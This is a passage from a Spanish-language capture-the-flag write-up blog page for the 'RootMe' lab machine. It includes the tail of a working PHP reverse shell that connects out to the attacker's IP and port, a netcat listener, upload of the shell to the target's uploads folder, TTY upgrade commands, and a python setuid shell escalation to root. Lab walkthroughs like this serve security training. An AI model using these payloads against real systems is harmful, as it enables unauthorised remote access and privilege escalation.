</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        if ($pid) {
</span></span><span class=line><span class=cl>                exit(0);  // Parent exits
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        // Make the current process a session leader
</span></span><span class=line><span class=cl>        // Will only succeed if we forked
</span></span><span class=line><span class=cl>        if (posix_setsid() == -1) {
</span></span><span class=line><span class=cl>                printit(&#34;Error: Can&#39;t setsid()&#34;);
</span></span><span class=line><span class=cl>                exit(1);
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        $daemon = 1;
</span></span><span class=line><span class=cl>} else {
</span></span><span class=line><span class=cl>        printit(&#34;WARNING: Failed to daemonise.  This is quite common and not fatal.&#34;);
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>// Change to a safe directory
</span></span><span class=line><span class=cl>chdir(&#34;/&#34;);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>// Remove any umask we inherited
</span></span><span class=line><span class=cl>umask(0);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>//
</span></span><span class=line><span class=cl>// Do the reverse shell...
</span></span><span class=line><span class=cl>//
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>// Open reverse connection
</span></span><span class=line><span class=cl>$sock = fsockopen($ip, $port, $errno, $errstr, 30);
</span></span><span class=line><span class=cl>if (!$sock) {
</span></span><span class=line><span class=cl>        printit(&#34;$errstr ($errno)&#34;);
</span></span><span class=line><span class=cl>        exit(1);
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>// Spawn shell process
</span></span><span class=line><span class=cl>$descriptorspec = array(
</span></span><span class=line><span class=cl>   0 =&gt; array(&#34;pipe&#34;, &#34;r&#34;),  // stdin is a pipe that the child will read from
</span></span><span class=line><span class=cl>   1 =&gt; array(&#34;pipe&#34;, &#34;w&#34;),  // stdout is a pipe that the child will write to
</span></span><span class=line><span class=cl>   2 =&gt; array(&#34;pipe&#34;, &#34;w&#34;)   // stderr is a pipe that the child will write to
</span></span><span class=line><span class=cl>);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$process = proc_open($shell, $descriptorspec, $pipes);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>if (!is_resource($process)) {
</span></span><span class=line><span class=cl>        printit(&#34;ERROR: Can&#39;t spawn shell&#34;);
</span></span><span class=line><span class=cl>        exit(1);
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>// Set everything to non-blocking
</span></span><span class=line><span class=cl>// Reason: Occsionally reads will block, even though stream_select tells us they won&#39;t
</span></span><span class=line><span class=cl>stream_set_blocking($pipes[0], 0);
</span></span><span class=line><span class=cl>stream_set_blocking($pipes[1], 0);
</span></span><span class=line><span class=cl>stream_set_blocking($pipes[2], 0);
</span></span><span class=line><span class=cl>stream_set_blocking($sock, 0);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>printit(&#34;Successfully opened reverse shell to $ip:$port&#34;);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>while (1) {
</span></span><span class=line><span class=cl>  // Check for end of TCP connection
</span></span><span class=line><span class=cl>        if (feof($sock)) {
</span></span><span class=line><span class=cl>                printit(&#34;ERROR: Shell connection terminated&#34;);
</span></span><span class=line><span class=cl>                break;
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        // Check for end of STDOUT
</span></span><span class=line><span class=cl>        if (feof($pipes[1])) {
</span></span><span class=line><span class=cl>                printit(&#34;ERROR: Shell process terminated&#34;);
</span></span><span class=line><span class=cl>                break;
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        // Wait until a command is end down $sock, or some
</span></span><span class=line><span class=cl>        // command output is available on STDOUT or STDERR
</span></span><span class=line><span class=cl>        $read_a = array($sock, $pipes[1], $pipes[2]);
</span></span><span class=line><span class=cl>        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        // If we can read from the TCP socket, send
</span></span><span class=line><span class=cl>        // data to process&#39;s STDIN
</span></span><span class=line><span class=cl>        if (in_array($sock, $read_a)) {
</span></span><span class=line><span class=cl>                if ($debug) printit(&#34;SOCK READ&#34;);
</span></span><span class=line><span class=cl>                $input = fread($sock, $chunk_size);
</span></span><span class=line><span class=cl>                if ($debug) printit(&#34;SOCK: $input&#34;);
</span></span><span class=line><span class=cl>                fwrite($pipes[0], $input);
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        // If we can read from the process&#39;s STDOUT
</span></span><span class=line><span class=cl>        // send data down tcp connection
</span></span><span class=line><span class=cl>        if (in_array($pipes[1], $read_a)) {
</span></span><span class=line><span class=cl>                if ($debug) printit(&#34;STDOUT READ&#34;);
</span></span><span class=line><span class=cl> $input = fread($pipes[2], $chunk_size);
</span></span><span class=line><span class=cl>                if ($debug) printit(&#34;STDERR: $input&#34;);
</span></span><span class=line><span class=cl>                fwrite($sock, $input);
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>fclose($sock);
</span></span><span class=line><span class=cl>fclose($pipes[0]);
</span></span><span class=line><span class=cl>fclose($pipes[1]);
</span></span><span class=line><span class=cl>fclose($pipes[2]);
</span></span><span class=line><span class=cl>proc_close($process);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>// Like print, but does nothing if we&#39;ve daemonised ourself
</span></span><span class=line><span class=cl>// (I can&#39;t figure out how to redirect STDOUT like a proper daemon)
</span></span><span class=line><span class=cl>function printit ($string) {
</span></span><span class=line><span class=cl>        if (!$daemon) {
</span></span><span class=line><span class=cl>                print &#34;$string\n&#34;;
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?&gt; 
</span></span></code></pre></div><p>Ya estaría niestro archivo, quedaria cambiar el parametro del puerto y de la IP a los niestros, yo por ejemplo tengo que poneri de IP la <code>10.10.46.8</code> y de puerto el <code>443</code>.</p><p>Vamos a ponernos por escucha en el puerto 443 desde nuetra terminal:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>➜ nc -nlvp 443
</span></span></code></pre></div><p>Y ahora subiremos el archivo a la página web.</p><p><img loading=lazy src=Images/rootme2.png alt></p><p>Vemos que se ha subido correctamente, pero si nos fijamos en nuestra terminal todavia no sale nada:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>nc -nlvp 443
</span></span><span class=line><span class=cl>listening on [any] 443 ...
</span></span></code></pre></div><p>Eso es porque el archivo se ha subido pero no se ha ejecutado, si nos acordamos el <code>wfuzz</code> nos ha dado previamente un directorio <code>/uploads</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>000000166:   301        9 L      28 W       314 Ch      &#34;uploads&#34;                                
</span></span></code></pre></div><p>Si nos movemos a la URL <code>http://10.10.84.238/uploads</code> veremos lo siguiente:</p><p><img loading=lazy src=Images/roote3.png alt></p><p>Vamos a hacer clic en nuestro archivo. Aparentemente no ha sucedido nada pero vamos a fijarnos en nuestra terminal:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
</span></span><span class=line><span class=cl> 14:33:41 up  1:05,  0 users,  load average: 0.00, 0.00, 0.56
</span></span><span class=line><span class=cl>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span></span><span class=line><span class=cl>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></span><span class=line><span class=cl>/bin/sh: 0: can&#39;t access tty; job control turned off
</span></span><span class=line><span class=cl>$ 
</span></span></code></pre></div><p>EUREKA!!! Estamos conectados a la máquina, pero todavia no hemos acabado.</p><p>Vamos a realizar un tratamiento de la tty para poder operar mas comodamente.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>script /dev/null -c bash
</span></span></code></pre></div><p><code>ctrl + z</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>stty raw -echo; fg
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>reset
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>xterm
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>export SHELL=bash
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>export TERM=xterm
</span></span></code></pre></div><p>Ahora tendriamos que ver algo así:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>www-data@rootme:/$ 
</span></span></code></pre></div><p>Para encontrar la bandera de usuario vamos a ponernos en el directorio <code>/var/www</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>www-data@rootme:/$ cd /var/www
</span></span><span class=line><span class=cl>www-data@rootme:/var/www$ cat user.txt
</span></span><span class=line><span class=cl>********************
</span></span><span class=line><span class=cl>www-data@rootme:/var/www$
</span></span></code></pre></div><p>Despés de buscar durante bastante, me di cuenta que en historial hay un comando un tanto extraño, lo podemos ver usando el comando <code>history</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>python -c &#39;import os; os.execl(&#34;/bin/sh&#34;, &#34;sh&#34;, &#34;-p&#34;)&#39;
</span></span></code></pre></div><p>Vamos a probar de poner este comando.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>www-data@rootme:/var/www$ python -c &#39;import os; os.execl(&#34;/bin/sh&#34;, &#34;sh&#34;, &#34;-p&#34;)&#39;
</span></span><span class=line><span class=cl># whoami
</span></span><span class=line><span class=cl>root
</span></span><span class=line><span class=cl># 
</span></span></code></pre></div><p>YA ESTAA!!! Si hacemos el comando <code>whoami</code> podremos ver que somos root. Ahora solo queda encontrar la bandera de root que en este caso está en <code>/root</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl># cat /root/root.txt
</span></span><span class=line><span class=cl>*************************
</span></span><span class=line><span class=cl># 
</span></span></code></pre></div><p>Y esto seria la resolución de la máquina RootMe, espero que os sirva de soporte por si os quedais estancados.</p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://b3nder0n.github.io/writeups/neighbour/><span class=title>« Anterior</span><br><span>Neighbour</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share RootMe on twitter" href="https://twitter.com/intent/tweet/?text=RootMe&url=https%3a%2f%2fb3nder0n.github.io%2fwriteups%2frootme%2f&hashtags="><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share RootMe on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fb3nder0n.github.io%2fwriteups%2frootme%2f&title=RootMe&summary=RootMe&source=https%3a%2f%2fb3nder0n.github.io%2fwriteups%2frootme%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share RootMe on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fb3nder0n.github.io%2fwriteups%2frootme%2f&title=RootMe"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share RootMe on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fb3nder0n.github.io%2fwriteups%2frootme%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share RootMe on whatsapp" href="https://api.whatsapp.com/send?text=RootMe%20-%20https%3a%2f%2fb3nder0n.github.io%2fwriteups%2frootme%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share RootMe on telegram" href="https://telegram.me/share/url?text=RootMe&url=https%3a%2f%2fb3nder0n.github.io%2fwriteups%2frootme%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://b3nder0n.github.io/>B3nder0n</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copiar";function s(){t.innerHTML="¡copiado!",setTimeout(()=>{t.innerHTML="copiar"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>